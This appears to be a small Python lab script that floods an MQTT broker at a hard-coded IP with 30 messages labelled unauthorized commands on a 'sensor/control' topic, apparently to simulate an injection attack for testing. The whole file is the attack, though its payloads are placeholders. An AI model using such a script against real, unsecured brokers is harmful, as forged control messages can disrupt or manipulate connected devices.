#!/usr/bin/env python3

import paho.mqtt.client as mqtt
import time

client = mqtt.Client()
client.connect("52.1.28.93", 1883) # Use your elastic IP address

for i in range(30):
	client.publish("sensor/control", f"UNAUTHORIZED_COMMAND_{i}")
	print(f"Sent malicious message {i}")
	time.sleep(0.2)

client.disconnect()
print("MQTT injection finished")

